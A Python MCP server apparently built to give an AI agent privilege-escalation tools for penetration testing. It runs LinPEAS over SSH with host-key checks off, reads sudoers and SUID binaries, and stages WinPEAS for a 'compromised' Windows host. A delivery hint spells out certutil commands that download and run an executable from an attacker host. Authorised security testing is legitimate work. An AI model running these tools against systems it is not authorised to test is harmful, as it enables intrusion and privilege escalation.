"""
Privesc MCP Server — Privilege Escalation Enumeration

Wraps PEASS-ng (LinPEAS / WinPEAS) and common privilege escalation checks.

Tools:
    run_linpeas   : Run LinPEAS on a remote Linux target via SSH
    run_winpeas   : Stage WinPEAS on a target via a Meterpreter session path
    check_sudo    : Quick sudo misconfiguration check on a target
    find_suid     : Find SUID/SGID binaries on a Linux target
"""

import os
import json
import subprocess
import tempfile
import logging
from typing import Optional
from fastmcp import FastMCP

logger = logging.getLogger(__name__)

SERVER_NAME = "privesc"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("PRIVESC_PORT", "8015"))

LINPEAS_PATH = os.getenv("LINPEAS_PATH", "/opt/peass/linpeas.sh")
WINPEAS_X64_PATH = os.getenv("WINPEAS_X64_PATH", "/opt/peass/winPEASx64.exe")
WINPEAS_ANY_PATH = os.getenv("WINPEAS_ANY_PATH", "/opt/peass/winPEASany.exe")

mcp = FastMCP(SERVER_NAME)


def _run(cmd: list[str], timeout: int = 300) -> dict:
    """Run a command and return result dict."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        return {
            "stdout": result.stdout[-8000:] if len(result.stdout) > 8000 else result.stdout,
            "stderr": result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr,
            "returncode": result.returncode,
            "success": result.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Command timed out", "returncode": -1, "success": False}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1, "success": False}


@mcp.tool()
def run_linpeas(
    target_ip: str,
    ssh_user: str,
    ssh_password: Optional[str] = None,
    ssh_key_path: Optional[str] = None,
    ssh_port: int = 22,
    timeout: int = 300,
) -> str:
    """
    Run LinPEAS on a remote Linux target via SSH and return the full output.

    Args:
        target_ip: Target IP or hostname
        ssh_user: SSH username (e.g. root, ubuntu, www-data)
        ssh_password: SSH password (use ssh_key_path instead when possible)
        ssh_key_path: Path to SSH private key file on this container (optional)
        ssh_port: SSH port (default 22)
        timeout: Max seconds to wait for LinPEAS to complete (default 300)

    Returns:
        JSON with stdout (LinPEAS output, truncated to 8KB), stderr, success flag.
        Focus on CRITICAL and HIGH findings (marked with yellow/red in output).
    """
    if not os.path.exists(LINPEAS_PATH):
        return json.dumps({
            "error": f"LinPEAS not found at {LINPEAS_PATH}. Rebuild the kali-sandbox container.",
            "success": False,
        })

    # Build SCP + SSH command to upload and execute linpeas
    ssh_opts = [
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(ssh_port),
    ]
    if ssh_key_path:
        ssh_opts += ["-i", ssh_key_path]

    # Upload linpeas.sh, execute it, clean up
    with tempfile.NamedTemporaryFile(suffix=".sh", delete=False) as tf:
        remote_path = f"/tmp/.linpeas_{os.path.basename(tf.name)}.sh"

    # SCP upload
    scp_cmd = ["scp"] + ssh_opts
    if ssh_password:
        scp_cmd = ["sshpass", "-p", ssh_password, "scp"] + ssh_opts
    scp_cmd += [LINPEAS_PATH, f"{ssh_user}@{target_ip}:{remote_path}"]
    scp_result = _run(scp_cmd, timeout=30)

    if not scp_result["success"]:
        return json.dumps({
            "error": f"SCP upload failed: {scp_result['stderr']}",
            "success": False,
        })

    # Execute remotely
    exec_cmd = ["ssh"] + ssh_opts
    if ssh_password:
        exec_cmd = ["sshpass", "-p", ssh_password, "ssh"] + ssh_opts
    exec_cmd += [
        f"{ssh_user}@{target_ip}",
        f"chmod +x {remote_path} && {remote_path}; rm -f {remote_path}",
    ]
    result = _run(exec_cmd, timeout=timeout)
    return json.dumps(result)


@mcp.tool()
def run_winpeas(
    output_dir: str = "/opt/output",
    arch: str = "x64",
) -> str:
    """
    Prepare WinPEAS binary for delivery to a Windows target.

    This tool copies the WinPEAS executable to the output directory so it can
    be served via Metasploit's web_delivery module or HTTP server for download
    by a compromised Windows host.

    Args:
        output_dir: Local directory to copy WinPEAS into (served via HTTP, default /opt/output)
        arch: Target architecture — x64 (default) or any (32-bit compatible)

    Returns:
        JSON with the local path and suggested delivery commands.
    """
    src = WINPEAS_X64_PATH if arch == "x64" else WINPEAS_ANY_PATH
    if not os.path.exists(src):
        return json.dumps({
            "error": f"WinPEAS not found at {src}. Rebuild the kali-sandbox container.",
            "success": False,
        })

    dest = os.path.join(output_dir, f"winPEAS_{arch}.exe")
    os.makedirs(output_dir, exist_ok=True)

    try:
        import shutil
        shutil.copy2(src, dest)
    except Exception as e:
        return json.dumps({"error": str(e), "success": False})

    return json.dumps({
        "success": True,
        "local_path": dest,
        "delivery_hint": (
            f"Serve with: python3 -m http.server 8080 -d {output_dir}\n"
            f"Download on target: certutil -urlcache -f http://LHOST:8080/winPEAS_{arch}.exe C:\\\\Windows\\\\Temp\\\\wp.exe\n"
            f"Execute: C:\\\\Windows\\\\Temp\\\\wp.exe"
        ),
    })


@mcp.tool()
def check_sudo(
    target_ip: str,
    ssh_user: str,
    ssh_password: Optional[str] = None,
    ssh_key_path: Optional[str] = None,
    ssh_port: int = 22,
) -> str:
    """
    Quick sudo misconfiguration check on a Linux target.
    Runs: sudo -l, id, whoami, cat /etc/sudoers (if readable).

    Args:
        target_ip: Target IP or hostname
        ssh_user: SSH username
        ssh_password: SSH password (optional)
        ssh_key_path: Path to SSH private key (optional)
        ssh_port: SSH port (default 22)
    """
    ssh_opts = [
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(ssh_port),
    ]
    if ssh_key_path:
        ssh_opts += ["-i", ssh_key_path]

    cmd = ["ssh"] + ssh_opts
    if ssh_password:
        cmd = ["sshpass", "-p", ssh_password, "ssh"] + ssh_opts
    cmd += [
        f"{ssh_user}@{target_ip}",
        "id; whoami; sudo -l 2>&1; cat /etc/sudoers 2>/dev/null | head -50",
    ]
    result = _run(cmd, timeout=30)
    return json.dumps(result)


@mcp.tool()
def find_suid(
    target_ip: str,
    ssh_user: str,
    ssh_password: Optional[str] = None,
    ssh_key_path: Optional[str] = None,
    ssh_port: int = 22,
) -> str:
    """
    Find SUID and SGID binaries on a Linux target (common privesc vectors).

    Args:
        target_ip: Target IP or hostname
        ssh_user: SSH username
        ssh_password: SSH password (optional)
        ssh_key_path: Path to SSH private key (optional)
        ssh_port: SSH port (default 22)
    """
    ssh_opts = [
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(ssh_port),
    ]
    if ssh_key_path:
        ssh_opts += ["-i", ssh_key_path]

    cmd = ["ssh"] + ssh_opts
    if ssh_password:
        cmd = ["sshpass", "-p", ssh_password, "ssh"] + ssh_opts
    cmd += [
        f"{ssh_user}@{target_ip}",
        "find / -perm -u=s -type f 2>/dev/null; find / -perm -g=s -type f 2>/dev/null",
    ]
    result = _run(cmd, timeout=60)
    return json.dumps(result)


if __name__ == "__main__":
    transport = os.getenv("MCP_TRANSPORT", "sse")
    mcp.run(transport=transport, host=SERVER_HOST, port=SERVER_PORT)
